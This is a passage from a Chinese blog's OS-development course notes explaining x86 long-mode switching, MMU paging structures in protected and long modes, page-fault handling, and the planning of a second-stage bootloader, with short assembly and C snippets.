<p>首先为了支持 64 位寻址中断门描述符在原有基础上增加 8 字节，用于存放目标段偏移的高 32 位值。其次，目标代码段选择子对应的代码段描述符必须是 64 位的代码段。最后其中的 IST 是 64 位 TSS 中的 IST 指针，因为我们不使用这个特性，所以不作详细介绍。</p>
<p>长模式也同样在内存中有一个中断门描述符表，只不过表中的条目（如上图所示）是 16 字节大小，最多支持 256 个中断源，对中断的响应和相关权限的检查和保护模式一样，这里不再赘述。</p>
<h3 id="切换到长模式"><a href="#切换到长模式" class="headerlink" title="切换到长模式"></a>切换到长模式</h3><p>我们既可以从实模式直接切换到长模式，也可以从保护模式切换长模式。切换到长模式的步骤如下。</p>
<p>第一步，准备长模式全局段描述符表。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">ex64_GDT:</span><br><span class="line">null_dsc: dq <span class="number">0</span></span><br><span class="line">;第一个段描述符CPU硬件规定必须为<span class="number">0</span></span><br><span class="line">c64_dsc:dq <span class="number">0x0020980000000000</span> ;<span class="number">64</span>位代码段</span><br><span class="line">d64_dsc:dq <span class="number">0x0000920000000000</span> ;<span class="number">64</span>位数据段</span><br><span class="line">eGdtLen equ $ - null_dsc ;GDT长度</span><br><span class="line">eGdtPtr:dw eGdtLen - <span class="number">1</span> ;GDT界限</span><br><span class="line">dq ex64_GDT</span><br></pre></td></tr></table></figure>
<p>第二步，准备长模式下的 MMU 页表，这个是为了开启分页模式，切换到长模式必须要开启分页，想想看，长模式下已经不对段基址和段长度进行检查了，那么内存地址空间就得不到保护了。</p>
<p>而长模式下内存地址空间的保护交给了 MMU，MMU 依赖页表对地址进行转换，页表有特定的格式存放在内存中，其地址由 CPU 的 CR3 寄存器指向，这在后面讲 MMU 的那节课会专门讲。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">mov eax, cr4</span><br><span class="line">bts eax, <span class="number">5</span> ;CR4.PAE = <span class="number">1</span></span><br><span class="line">mov cr4, eax ;开启 PAE</span><br><span class="line">mov eax, PAGE_TLB_BADR ;页表物理地址</span><br><span class="line">mov cr3, eax</span><br></pre></td></tr></table></figure>

<p>开启长模式，要同时开启保护模式和分页模式，在实现长模式时定义了 MSR 寄存器，需要用专用的指令 rdmsr、wrmsr 进行读写，IA32_EFER 寄存器的地址为 0xC0000080，它的第 8 位决定了是否开启长模式。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">;开启 <span class="number">64</span>位长模式</span><br><span class="line">mov ecx, IA32_EFER</span><br><span class="line">rdmsr</span><br><span class="line">bts eax, <span class="number">8</span> ;IA32_EFER.LME =<span class="number">1</span></span><br><span class="line">wrmsr</span><br><span class="line">;开启 保护模式和分页模式</span><br><span class="line">mov eax, cr0</span><br><span class="line">bts eax, <span class="number">0</span> ;CR0.PE =<span class="number">1</span></span><br><span class="line">bts eax, <span class="number">31</span></span><br><span class="line">mov cr0, eax</span><br></pre></td></tr></table></figure>
<p>进行跳转，加载 CS 段寄存器，刷新其影子寄存器。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">jmp <span class="number">08</span>:entry64 ;entry64为程序标号即<span class="number">64</span>位偏移地址</span><br></pre></td></tr></table></figure>
<p>切换到长模式和切换保护模式的流程差不多，只是需要准备的段描述符有所区别，还有就是要注意同时开启保护模式和分页模式。原因在上面已经说明了。</p>
]]></content>
      <categories>
        <category>操作系统实战</category>
      </categories>
      <tags>
        <tag>操作系统实战</tag>
      </tags>
  </entry>
  <entry>
    <title>操作系统实战04-程序中的地址如何转换</title>
    <url>/2021/11/08/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%AE%9E%E6%88%9804-%E7%A8%8B%E5%BA%8F%E4%B8%AD%E7%9A%84%E5%9C%B0%E5%9D%80%E5%A6%82%E4%BD%95%E8%BD%AC%E6%8D%A2/</url>
    <content><![CDATA[<h2 id="虚拟地址和物理地址"><a href="#虚拟地址和物理地址" class="headerlink" title="虚拟地址和物理地址"></a>虚拟地址和物理地址</h2><h3 id="虚拟地址"><a href="#虚拟地址" class="headerlink" title="虚拟地址"></a>虚拟地址</h3><p>正如其名，这个地址是虚拟的，自然而然地和具体环境进行了解耦，这个环境包括系统软件环境和硬件环境。</p>
<p>虚拟地址是逻辑上存在的一个数据值，比如 0<del>100 就有 101 个整数值，这个 0</del>100 的区间就可以说是一个虚拟地址空间，该虚拟地址空间有 101 个地址。</p>
<h3 id="物理地址"><a href="#物理地址" class="headerlink" title="物理地址"></a>物理地址</h3><p>虽然虚拟地址解决了很多问题，但是虚拟地址只是逻辑上存在的地址，无法作用于硬件电路的，程序装进内存中想要执行，就需要和内存打交道，从内存中取得指令和数据。而内存只认一种地址，那就是物理地址。</p>
<p>什么是物理地址呢？物理地址在逻辑上也是一个数据，只不过这个数据会被地址译码器等电子器件变成电子信号，放在地址总线上，地址总线电子信号的各种组合就可以选择到内存的储存单元了。</p>
<p>但是地址总线上的信号（即物理地址），也可以选择到别的设备中的储存单元，如显卡中的显存、I&#x2F;O 设备中的寄存器、网卡上的网络帧缓存器。不过如果不做特别说明，我们说的物理地址就是指选择内存单元的地址。</p>
<h2 id="虚拟地址到物理地址的转换"><a href="#虚拟地址到物理地址的转换" class="headerlink" title="虚拟地址到物理地址的转换"></a>虚拟地址到物理地址的转换</h2><p>明白了虚拟地址和物理地址之后，我们发现虚拟地址必须转换成物理地址，这样程序才能正常执行。要转换就必须要转换机构，它相当于一个函数：p&#x3D;f(v)，输入虚拟地址 v，输出物理地址 p。</p>
<p>那么要怎么实现这个函数呢？</p>
<p>用软件方式实现太低效，用硬件实现没有灵活性，最终就用了软硬件结合的方式实现，它就是 MMU（内存管理单元）。MMU 可以接受软件给出的地址对应关系数据，进行地址转换。</p>
<p>我们先来看看逻辑上的 MMU 工作原理框架图。如下图所示：</p>
<img src="/2021/11/08/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%AE%9E%E6%88%9804-%E7%A8%8B%E5%BA%8F%E4%B8%AD%E7%9A%84%E5%9C%B0%E5%9D%80%E5%A6%82%E4%BD%95%E8%BD%AC%E6%8D%A2/MMU%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86%E5%9B%BE.png" class="">

<p>上图中展示了 MMU 通过地址关系转换表，将 0x80000<del>0x84000 的虚拟地址空间转换成 0x10000</del>0x14000 的物理地址空间，而地址关系转换表本身则是放物理内存中的。</p>
<p>下面我们不妨想一想地址关系转换表的实现. 如果在地址关系转换表中，这样来存放：一个虚拟地址对应一个物理地址。</p>
<p>那么问题来了，32 位地址空间下，4GB 虚拟地址的地址关系转换表就会把整个 32 位物理地址空间用完，这显然不行。</p>
<p>要是结合前面的保护模式下分段方式呢，地址关系转换表中存放：一个虚拟段基址对应一个物理段基址，这样看似可以，但是因为段长度各不相同，所以依然不可取。</p>
<p>综合刚才的分析，系统设计者最后采用一个折中的方案，即把虚拟地址空间和物理地址空间都分成同等大小的块，也称为页，按照虚拟页和物理页进行转换。根据软件配置不同，这个页的大小可以设置为 4KB、2MB、4MB、1GB，这样就进入了现代内存管理模式——分页模型。</p>
<p>下面来看看分页模型框架，如下图所示：</p>
<img src="/2021/11/08/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%AE%9E%E6%88%9804-%E7%A8%8B%E5%BA%8F%E4%B8%AD%E7%9A%84%E5%9C%B0%E5%9D%80%E5%A6%82%E4%BD%95%E8%BD%AC%E6%8D%A2/%E5%88%86%E9%A1%B5%E6%A8%A1%E5%9E%8B%E6%A1%86%E6%9E%B6%E5%9B%BE.png" class="">

<p>结合图片可以看出，一个虚拟页可以对应到一个物理页，由于页大小一经配置就是固定的，所以在地址关系转换表中，只要存放虚拟页地址对应的物理页地址就行了。</p>
<p>我知道，说到这里，也许你仍然没搞清楚 MMU 和地址关系转换表的细节，别急，我们现在已经具备了研究它们的基础，下面我们就去探索它们。</p>
<h2 id="MMU"><a href="#MMU" class="headerlink" title="MMU"></a>MMU</h2><p>MMU 即内存管理单元，是用硬件电路逻辑实现的一个地址转换器件，它负责接受虚拟地址和地址关系转换表，以及输出物理地址。</p>
<p>根据实现方式的不同，MMU 可以是独立的芯片，也可以是集成在其它芯片内部的，比如集成在 CPU 内部，x86、ARM 系列的 CPU 就是将 MMU 集成在 CPU 核心中的。</p>
<p>SUN 公司的 CPU 是将独立的 MMU 芯片卡在总线上的，有一夫当关的架势。下面我们只研究 x86 CPU 中的 MMU。x86 CPU 要想开启 MMU，就必须先开启保护模式或者长模式，实模式下是不能开启 MMU 的。</p>
<p>由于保护模式的内存模型是分段模型，它并不适合于 MMU 的分页模型，所以我们要使用保护模式的平坦模式，这样就绕过了分段模型。这个平坦模型和长模式下忽略段基址和段长度是异曲同工的。地址产生的过程如下所示。</p>
<img src="/2021/11/08/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%AE%9E%E6%88%9804-%E7%A8%8B%E5%BA%8F%E4%B8%AD%E7%9A%84%E5%9C%B0%E5%9D%80%E5%A6%82%E4%BD%95%E8%BD%AC%E6%8D%A2/CPU%E5%9C%B0%E5%9D%80%E8%BD%AC%E6%8D%A2%E5%9B%BE.png" class="">

<p>上图中，程序代码中的虚拟地址，经过 CPU 的分段机制产生了线性地址，平坦模式和长模式下线性地址和虚拟地址是相等的。</p>
<p>如果不开启 MMU，在保护模式下可以关闭 MMU，这个线性地址就是物理地址。因为长模式下的分段弱化了地址空间的隔离，所以开启 MMU 是必须要做的，开启 MMU 才能访问内存地址空间。</p>
<h3 id="MMU-页表"><a href="#MMU-页表" class="headerlink" title="MMU 页表"></a>MMU 页表</h3><p>现在我们开始研究地址关系转换表，其实它有个更加专业的名字——页表。它描述了虚拟地址到物理地址的转换关系，也可以说是虚拟页到物理页的映射关系，所以称为页表。</p>
<p>为了增加灵活性和节约物理内存空间（因为页表是放在物理内存中的），所以页表中并不存放虚拟地址和物理地址的对应关系，只存放物理页面的地址，MMU 以虚拟地址为索引去查表返回物理页面地址，而且页表是分级的，总体分为三个部分：一个顶级页目录，多个中级页目录，最后才是页表，逻辑结构图如下.</p>
<img src="/2021/11/08/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%AE%9E%E6%88%9804-%E7%A8%8B%E5%BA%8F%E4%B8%AD%E7%9A%84%E5%9C%B0%E5%9D%80%E5%A6%82%E4%BD%95%E8%BD%AC%E6%8D%A2/MMU%E9%A1%B5%E8%A1%A8%E5%8E%9F%E7%90%86%E5%9B%BE.png" class="">

<p>从上面可以看出，一个虚拟地址被分成从左至右四个位段。</p>
<p>第一个位段索引顶级页目录中一个项，该项指向一个中级页目录，然后用第二个位段去索引中级页目录中的一个项，该项指向一个页目录，再用第三个位段去索引页目录中的项，该项指向一个物理页地址，最后用第四个位段作该物理页内的偏移去访问物理内存。这就是 MMU 的工作流程。</p>
<h2 id="保护模式下的分页"><a href="#保护模式下的分页" class="headerlink" title="保护模式下的分页"></a>保护模式下的分页</h2><p>前面的内容都是理论上帮助我们了解分页模式原理的，分页模式的灵活性、通用性、安全性，是现代操作系统内存管理的基石，更是事实上的标准内存管理模型，现代商用操作系统都必须以此为基础实现虚拟内存功能模块。</p>
<p>因为我们的主要任务是开发操作系统，而开发操作系统就落实到真实的硬件平台上去的，下面我们就来研究 x86 CPU 上的分页模式。</p>
<p>首先来看看保护模式下的分页，保护模式下只有 32 位地址空间，最多 4GB-1 大小的空间。</p>
<p>根据前面得知 32 位虚拟地址经过分段机制之后得到线性地址，又因为通常使用平坦模式，所以线性地址和虚拟地址是相同的。</p>
<p>保护模式下的分页大小通常有两种，一种是 4KB 大小的页，一种是 4MB 大小的页。分页大小的不同，会导致虚拟地址位段的分隔和页目录的层级不同，但虚拟页和物理页的大小始终是等同的。</p>
<h3 id="保护模式下的分页——4KB-页"><a href="#保护模式下的分页——4KB-页" class="headerlink" title="保护模式下的分页——4KB 页"></a>保护模式下的分页——4KB 页</h3><p>该分页方式下，32 位虚拟地址被分为三个位段：页目录索引、页表索引、页内偏移，只有一级页目录，其中包含 1024 个条目 ，每个条目指向一个页表，每个页表中有 1024 个条目。其中一个条目就指向一个物理页，每个物理页 4KB。这正好是 4GB 地址空间。如下图所示。</p>
<img src="/2021/11/08/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%AE%9E%E6%88%9804-%E7%A8%8B%E5%BA%8F%E4%B8%AD%E7%9A%84%E5%9C%B0%E5%9D%80%E5%A6%82%E4%BD%95%E8%BD%AC%E6%8D%A2/%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F%E4%B8%8B%E7%9A%844KB%E5%88%86%E9%A1%B5.png" class="">

<p>上图中 CR3 就是 CPU 的一个 32 位的寄存器，MMU 就是根据这个寄存器找到页目录的。下面，我们看看当前分页模式下的 CR3、页目录项、页表项的格式。</p>
<img src="/2021/11/08/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%AE%9E%E6%88%9804-%E7%A8%8B%E5%BA%8F%E4%B8%AD%E7%9A%84%E5%9C%B0%E5%9D%80%E5%A6%82%E4%BD%95%E8%BD%AC%E6%8D%A2/4KB%E5%88%86%E9%A1%B5%E8%A1%A8%E9%A1%B9.png" class="">

<p>可以看到，页目录项、页表项都是 4 字节 32 位，1024 个项正好是 4KB（一个页），因此它们的地址始终是 4KB 对齐的，所以低 12 位才可以另作它用，形成了页面的相关属性，如是否存在、是否可读可写、是用户页还是内核页、是否已写入、是否已访问等。</p>
<h3 id="保护模式下的分页——4MB-页"><a href="#保护模式下的分页——4MB-页" class="headerlink" title="保护模式下的分页——4MB 页"></a>保护模式下的分页——4MB 页</h3><p>该分页方式下，32 位虚拟地址被分为两个位段：页表索引、页内偏移，只有一级页目录，其中包含 1024 个条目。其中一个条目指向一个物理页，每个物理页 4MB，正好为 4GB 地址空间，如下图所示。</p>
<img src="/2021/11/08/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%AE%9E%E6%88%9804-%E7%A8%8B%E5%BA%8F%E4%B8%AD%E7%9A%84%E5%9C%B0%E5%9D%80%E5%A6%82%E4%BD%95%E8%BD%AC%E6%8D%A2/%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F%E4%B8%8B%E7%9A%844MB%E5%88%86%E9%A1%B5.png" class="">

<p>CR3 还是 32 位的寄存器，只不过不再指向顶级页目录了，而是指向一个 4KB 大小的页表，这个页表依然要 4KB 地址对齐，其中包含 1024 个页表项，格式如下图。</p>
<img src="/2021/11/08/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%AE%9E%E6%88%9804-%E7%A8%8B%E5%BA%8F%E4%B8%AD%E7%9A%84%E5%9C%B0%E5%9D%80%E5%A6%82%E4%BD%95%E8%BD%AC%E6%8D%A2/%E4%BF%9D%E6%8A%A4%E6%A8%A1%E5%BC%8F4MB%E5%88%86%E9%A1%B5%E8%A1%A8%E9%A1%B9.png" class="">

<p>可以发现，4MB 大小的页面下，页表项还是 4 字节 32 位，但只需要用高 10 位来保存物理页面的基地址就可以。因为每个物理页面都是 4MB，所以低 22 位始终为 0，为了兼容 4MB 页表项低 8 位和 4KB 页表项一样，只不过第 7 位变成了 PS 位，且必须为 1，而 PAT 位移到了 12 位。</p>
<h2 id="长模式下的分页"><a href="#长模式下的分页" class="headerlink" title="长模式下的分页"></a>长模式下的分页</h2><p>如果开启了长模式，则必须同时开启分页模式，因为长模式弱化了分段模型，而分段模型也确实有很多不足，不适应现在操作系统和应用软件的发展。</p>
<p>同时，长模式也扩展了 CPU 的位宽，使得 CPU 能使用 64 位的超大内存地址空间。所以，长模式下的虚拟地址必须等于线性地址且为 64 位。</p>
<p>长模式下的分页大小通常也有两种，4KB 大小的页和 2MB 大小的页。</p>
<h3 id="长模式下的分页——4KB-页"><a href="#长模式下的分页——4KB-页" class="headerlink" title="长模式下的分页——4KB 页"></a>长模式下的分页——4KB 页</h3><p>该分页方式下，64 位虚拟地址被分为 6 个位段，分别是：保留位段，顶级页目录索引、页目录指针索引、页目录索引、页表索引、页内偏移，顶级页目录、页目录指针、页目录、页表各占有 4KB 大小，其中各有 512 个条目，每个条目 8 字节 64 位大小，如下图所示。</p>
<img src="/2021/11/08/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%AE%9E%E6%88%9804-%E7%A8%8B%E5%BA%8F%E4%B8%AD%E7%9A%84%E5%9C%B0%E5%9D%80%E5%A6%82%E4%BD%95%E8%BD%AC%E6%8D%A2/%E9%95%BF%E6%A8%A1%E5%BC%8F%E4%B8%8B%E7%9A%844KB%E5%88%86%E9%A1%B5.png" class="">

<p>上面图中 CR3 已经变成 64 位的 CPU 的寄存器，它指向一个顶级页目录，里面的顶级页目项指向页目录指针，依次类推。</p>
<p>需要注意的是，虚拟地址 48 到 63 这 16 位是根据第 47 位来决定的，47 位为 1，它们就为 1，反之为 0，这是因为 x86 CPU 并没有实现全 64 位的地址总线，而是只实现了 48 位，但是 CPU 的寄存器却是 64 位的。</p>
<p>这种最高有效位填充的方式，即使后面扩展 CPU 的地址总线也不会有任何影响，下面我们去看看当前分页模式下的 CR3、顶级页目录项、页目录指针项、页目录项、页表项的格式，我画了一张图帮你理解。</p>
<img src="/2021/11/08/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%AE%9E%E6%88%9804-%E7%A8%8B%E5%BA%8F%E4%B8%AD%E7%9A%84%E5%9C%B0%E5%9D%80%E5%A6%82%E4%BD%95%E8%BD%AC%E6%8D%A2/%E9%95%BF%E6%A8%A1%E5%BC%8F%E4%B8%8B%E7%9A%844KB%E5%88%86%E9%A1%B5%E8%A1%A8%E9%A1%B9.png" class="">

<p>由上图可知，长模式下的 4KB 分页下，由一个顶层目录、二级中间层目录和一层页表组成了 64 位地址翻译过程。</p>
<p>顶级页目录项指向页目录指针页，页目录指针项指向页目录页，页目录项指向页表页，页表项指向一个 4KB 大小的物理页，各级页目录项中和页表项中依然存在各种属性位，这在图中已经说明。其中的 XD 位，可以控制代码页面是否能够运行。</p>
<h3 id="长模式下的分页——2MB-页"><a href="#长模式下的分页——2MB-页" class="headerlink" title="长模式下的分页——2MB 页"></a>长模式下的分页——2MB 页</h3><p>在这种分页方式下，64 位虚拟地址被分为 5 个位段 ：保留位段、顶级页目录索引、页目录指针索引、页目录索引，页内偏移，顶级页目录、页目录指针、页目录各占有 4KB 大小，其中各有 512 个条目，每个条目 8 字节 64 位大小。</p>
<img src="/2021/11/08/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%AE%9E%E6%88%9804-%E7%A8%8B%E5%BA%8F%E4%B8%AD%E7%9A%84%E5%9C%B0%E5%9D%80%E5%A6%82%E4%BD%95%E8%BD%AC%E6%8D%A2/%E9%95%BF%E6%A8%A1%E5%BC%8F%E4%B8%8B%E7%9A%842MB%E5%88%86%E9%A1%B5.png" class="">


<p>可以发现，长模式下 2MB 和 4KB 分页的区别是，2MB 分页下是页目录项直接指向了 2MB 大小的物理页面，放弃了页表项，然后把虚拟地址的低 21 位作为页内偏移，21 位正好索引 2MB 大小的地址空间。</p>
<p>下面我们还是要去看看 2MB 分页模式下的 CR3、顶级页目录项、页目录指针项、页目录项的格式，格式如下图。</p>
<img src="/2021/11/08/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%AE%9E%E6%88%9804-%E7%A8%8B%E5%BA%8F%E4%B8%AD%E7%9A%84%E5%9C%B0%E5%9D%80%E5%A6%82%E4%BD%95%E8%BD%AC%E6%8D%A2/%E9%95%BF%E6%A8%A1%E5%BC%8F%E4%B8%8B%E7%9A%842MB%E5%88%86%E9%A1%B5%E8%A1%A8%E9%A1%B9.png" class="">

<p>上图中没有了页表项，取而代之的是，页目录项中直接存放了 2MB 物理页基地址。由于物理页始终 2MB 对齐，所以其地址的低 21 位为 0，用于存放页面属性位。</p>
<h2 id="开启-MMU"><a href="#开启-MMU" class="headerlink" title="开启 MMU"></a>开启 MMU</h2><p>要使用分页模式就必先开启 MMU，但是开启 MMU 的前提是 CPU 进入保护模式或者长模式，开启 CPU 这两种模式的方法，我们在前面第五节课已经讲过了，下面我们就来开启 MMU，步骤如下：</p>
<ol>
<li><p>使 CPU 进入保护模式或者长模式。</p>
</li>
<li><p>准备好页表数据，这包含顶级页目录，中间层页目录，页表，假定我们已经编写了代码，在物理内存中生成了这些数据。</p>
</li>
<li><p>把顶级页目录的物理内存地址赋值给 CR3 寄存器。</p>
<figure class="highlight armasm"><table><tr><td class="code"><pre><span class="line"><span class="keyword">mov</span> eax, PAGE_TLB_BADR <span class="comment">;页表物理地址</span></span><br><span class="line"><span class="keyword">mov</span> cr3, eax</span><br></pre></td></tr></table></figure>
</li>
<li><p>设置 CPU 的 CR0 的 PE 位为 1，这样就开启了 MMU。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">;开启 保护模式和分页模式</span><br><span class="line">mov eax, cr0</span><br><span class="line">bts eax, 0 ;CR0.PE =1</span><br><span class="line">bts eax, 31 ;CR0.P = 1</span><br><span class="line">mov cr0, eax</span><br></pre></td></tr></table></figure></li>
</ol>
<h2 id="MMU-地址转换失败"><a href="#MMU-地址转换失败" class="headerlink" title="MMU 地址转换失败"></a>MMU 地址转换失败</h2><p>MMU 的主要功能是根据页表数据把虚拟地址转换成物理地址，但有没有可能转换失败？</p>
<p>绝对有可能，例如，页表项中的数据为空，用户程序访问了超级管理者的页面，向只读页面中写入数据。这些都会导致 MMU 地址转换失败。</p>
<p>MMU 地址转换失败了怎么办呢？失败了既不能放行，也不是 reset，MMU 执行的操作如下。</p>
<p>1.MMU 停止转换地址。</p>
<p>2.MMU 把转换失败的虚拟地址写入 CPU 的 CR2 寄存器。</p>
<p>3.MMU 触发 CPU 的 14 号中断，使 CPU 停止执行当前指令。</p>
<p>4.CPU 开始执行 14 号中断的处理代码，代码会检查原因，处理好页表数据返回。</p>
<p>5.CPU 中断返回继续执行 MMU 地址转换失败时的指令。</p>
<p>这里你只要先明白这个流程就好了，后面课程讲到内存管理的时候我们继续探讨。</p>
]]></content>
      <categories>
        <category>操作系统实战</category>
      </categories>
      <tags>
        <tag>操作系统实战</tag>
      </tags>
  </entry>
  <entry>
    <title>操作系统实战05-建造二级引导器</title>
    <url>/2021/11/01/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%AE%9E%E6%88%9805-%E5%BB%BA%E9%80%A0%E4%BA%8C%E7%BA%A7%E5%BC%95%E5%AF%BC%E5%99%A8/</url>
    <content><![CDATA[<p>二级引导器作为操作系统的先驱，它需要收集机器信息，确定这个计算机能不能运行我们的操作系统，对 CPU、内存、显卡进行一些初级的配置，放置好内核相关的文件。</p>
<h1 id="二级引导器"><a href="#二级引导器" class="headerlink" title="二级引导器"></a>二级引导器</h1><p>我们的二级引导器不是执行具体的加载任务，而是解析内核文件、收集机器环境信息。</p>
<p>二级引导器作为操作系统的先驱，它需要收集机器信息，确定这个计算机能不能运行我们的操作系统，对 CPU、内存、显卡进行一些初级的配置，放置好内核相关的文件。</p>
<h2 id="设计机器信息结构"><a href="#设计机器信息结构" class="headerlink" title="设计机器信息结构"></a>设计机器信息结构</h2><p>二级引导器的功能是收集信息，这里就需要设计一个数据结构存放相应的信息。我们将这个结构放在内存 1MB 的地方，方便以后传给我们的操作系统。</p>
<p>这个数据结构的关键代码如下所示。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Cosmos/initldr/include/ldrtype.h</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">s_MACHBSTART</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">u64_t</span>    mb_krlinitstack;    <span class="comment">// 内核栈地址</span></span><br><span class="line">    <span class="type">u64_t</span>    mb_krlitstacksz;    <span class="comment">// 内核栈大小</span></span><br><span class="line">    <span class="type">u64_t</span>    mb_imgpadr;         <span class="comment">// 操作系统映像</span></span><br><span class="line">    <span class="type">u64_t</span>    mb_imgsz;           <span class="comment">// 操作系统映像大小</span></span><br><span class="line">    <span class="type">u64_t</span>    mb_bfontpadr;       <span class="comment">// 操作系统字体地址</span></span><br><span class="line">    <span class="type">u64_t</span>    mb_bfontsz;         <span class="comment">// 操作系统字体大小</span></span><br><span class="line">    <span class="type">u64_t</span>    mb_fvrmphyadr;      <span class="comment">// 机器显存地址</span></span><br><span class="line">    <span class="type">u64_t</span>    mb_fvrmsz;          <span class="comment">// 机器显存大小</span></span><br><span class="line">    <span class="type">u64_t</span>    mb_cpumode;         <span class="comment">// 机器CPU工作模式</span></span><br><span class="line">    <span class="type">u64_t</span>    mb_memsz;           <span class="comment">// 机器内存大小</span></span><br><span class="line">    <span class="type">u64_t</span>    mb_e820padr;        <span class="comment">// 机器e820数组地址</span></span><br><span class="line">    <span class="type">u64_t</span>    mb_e820nr;          <span class="comment">// 机器e820数组元素个数</span></span><br><span class="line">    <span class="type">u64_t</span>    mb_e820sz;          <span class="comment">// 机器e820数组大小</span></span><br><span class="line">    <span class="comment">//……</span></span><br><span class="line">    <span class="type">u64_t</span>    mb_pml4padr;        <span class="comment">// 机器页表数据地址</span></span><br><span class="line">    <span class="type">u64_t</span>    mb_subpageslen;     <span class="comment">// 机器页表个数</span></span><br><span class="line">    <span class="type">u64_t</span>    mb_kpmapphymemsz;   <span class="comment">// 操作系统映射空间大小</span></span><br><span class="line">    <span class="comment">//……</span></span><br><span class="line">    <span class="type">graph_t</span> mb_ghparm;           <span class="comment">// 图形信息</span></span><br><span class="line">&#125;__attribute__((packed)) <span class="type">machbstart_t</span>;</span><br></pre></td></tr></table></figure>

<h2 id="规划二级引导器"><a href="#规划二级引导器" class="headerlink" title="规划二级引导器"></a>规划二级引导器</h2><p>首先整体划分一下二级引导器的功能模块，从全局了解下功能应该怎么划分，如下表所示。</p>
<table>
<thead>
<tr>
<th>文件名</th>
<th>功能</th>
</tr>
</thead>
<tbody><tr>
<td>imginithead.asm</td>
<td>GRUB 头的汇编部分</td>
</tr>
<tr>
<td>inithead.c</td>
<td>GRUB 头的 C 语言部分，用于放置二级引导器到指定的内存中</td>
</tr>
<tr>
<td>realintsve.asm</td>
<td>实现调用 BIOS 中断功能</td>
</tr>
<tr>
<td>ldrkrl32.asm</td>
<td>二级引导器核心入口汇编部分</td>
</tr>
<tr>
<td>ldrkrlentry.c</td>
<td>二级引导器核心入口</td>
</tr>
<tr>
<td>bstartparm.c</td>
<td>实现收集机器信息建立页面数据</td>
</tr>
<tr>
<td>chkcpmm.c</td>
<td>实现检查 CPU 工作模式和内存视图</td>
</tr>
<tr>
<td>fs.c</td>
<td>实现解析映像文件的功能</td>
</tr>
<tr>
<td>graph.c</td>
<td>实现切换显卡图形模式</td>
</tr>
<tr>
<td>vgastr.c</td>
<td>实现字符串输出</td>
</tr>
</tbody></table>
<p>它们在编译之后会形成三个文件，编译脚本我已经写好了，下面我们用一幅图来展示这个编译过程。</p>
<img src="/2021/11/01/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%AE%9E%E6%88%9805-%E5%BB%BA%E9%80%A0%E4%BA%8C%E7%BA%A7%E5%BC%95%E5%AF%BC%E5%99%A8/%E4%BA%8C%E7%BA%A7%E5%BC%95%E5%AF%BC%E5%99%A8%E7%BC%96%E8%AF%91%E8%BF%87%E7%A8%8B%E7%A4%BA%E6%84%8F%E5%9B%BE.png" class="">

<p>下面为二级引导器的整个执行时序图。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">@startuml</span><br><span class="line">imginithead.asm -&gt; imginithead.asm : _entry 关中断，加载 GDT </span><br><span class="line">imginithead.asm -&gt; imginithead.asm : _32bits_mode 初始化段寄存器和通用寄存器、栈寄存器</span><br><span class="line">imginithead.asm -&gt; inithead.c : inithead_entry 初始化</span><br><span class="line">inithead.c -&gt; inithead.c : write_realintsvefile 将 initldrsve.bin 文件写入物理内存 0x1000(4KB) 处</span><br><span class="line">inithead.c -&gt; inithead.c : write_ldrkrlfile 将 initldrkrl.bin 文件写入物理内存 0x200000(2MB) 处</span><br><span class="line">imginithead.asm -&gt; ldrkrl32.asm : jmp 0x200000(2MB) 处执行相应的代码</span><br><span class="line">ldrkrl32.asm -&gt; ldrkrl32.asm : _entry 关中断，加载GDT,加载IDT</span><br><span class="line">ldrkrl32.asm -&gt; ldrkrlentry.c : _32bits_mode 初始化段寄存器和通用寄存器、栈寄存器</span><br><span class="line">ldrkrlentry.c -&gt; ldrkrlentry.c : ldrkrl_entry 进入二级引导器</span><br><span class="line">ldrkrlentry.c -&gt; bstartparm.c : init_bstartparm 处理开始参数</span><br><span class="line">bstartparm.c -&gt; bstartparm.c : machbstart_t_init 初始化 machbstart_t 结构体</span><br><span class="line">bstartparm.c -&gt; chkcpmm.c : init_chkcpu 检查 CPU</span><br><span class="line">chkcpmm.c -&gt; chkcpmm.c : chk_cpuid 判断是否支持 CPUID</span><br><span class="line">chkcpmm.c -&gt; chkcpmm.c : chk_cpu_longmode 检查CPU是否支持长模式</span><br><span class="line">bstartparm.c -&gt; chkcpmm.c : init_mem 获取内存布局信息</span><br><span class="line">bstartparm.c -&gt; chkcpmm.c : init_krlinitstack 初始化内核栈</span><br><span class="line">bstartparm.c -&gt; fs.c : init_krlfile 放置内核文件</span><br><span class="line">bstartparm.c -&gt; fs.c : init_defutfont 放置字库文件 </span><br><span class="line">bstartparm.c -&gt; chkcpmm.c : init_meme820 跳过内核初始化内存 </span><br><span class="line">bstartparm.c -&gt; chkcpmm.c : init_bstartpages 建立 MMU 页表数据 </span><br><span class="line">bstartparm.c -&gt; graph.c : init_graph 